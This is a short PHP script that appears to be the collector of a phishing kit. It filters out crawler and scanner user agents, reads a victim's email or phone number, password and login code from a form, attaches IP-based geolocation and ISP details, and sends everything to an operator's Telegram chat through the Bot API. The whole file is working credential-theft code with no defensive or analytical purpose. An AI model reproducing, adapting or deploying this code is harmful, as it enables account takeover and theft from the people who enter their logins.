<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: oops.php');
die();
}

// system function to process bot
function sendMessage($idTelegram, $messageBot, $tokenBot) {

    $url = "https://api.telegram.org/bot" . $tokenBot . "/sendMessage?parse_mode=html&chat_id=" . $idTelegram;
    $url = $url . "&text=" . urlencode($messageBot);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

// get the bot data that you have set
include 'botSetting.php';
include 'api/geoip.php';

// get the data entered by the user
$email = $_POST['godhelpmema'];
$password = $_POST['godhelpmepa'];
$logincode = $_POST['logincode'];

// system will redirect to the main page if no data is entered
if($email == "" && $password == "" && $logincode == ""){
header("Location: index.php");
} else {

// message content to sent to bot
$messageBot = "
━━━━━༻NEWSC༺━━━━
➤Email / Phone : <code>$email</code>
➤Password : <code>$password</code>
➤Login Code : <code>$logincode</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
➤Country : $flag | $countrycode | $dialcode | $country
➤Ip Address : <code>$ip_address</code>
➤Benua : $continent 
➤Propinsi : $province
➤Kota : $city
➤Operator : $isp
➤Time Zone : $jamasuk
━━━━━༻NEWSC༺━━━━
";
}

// sent all data to bot
sendMessage($idTelegram, $messageBot, $tokenBot);
?>